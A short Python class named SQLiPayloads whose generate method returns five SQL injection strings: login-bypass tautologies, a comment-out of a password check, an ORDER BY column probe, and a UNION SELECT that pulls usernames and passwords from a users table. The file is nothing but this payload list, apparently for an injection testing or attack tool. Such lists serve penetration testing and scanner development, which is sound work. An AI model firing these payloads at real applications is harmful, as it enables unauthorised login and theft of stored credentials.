class SQLiPayloads:
    def generate(self):
        return [
            "' OR '1'='1",
            "' OR 1=1 -- -",
            "admin'--",
            "1' ORDER BY 1-- -",
            "1' UNION SELECT null, username, password FROM users-- -"
        ]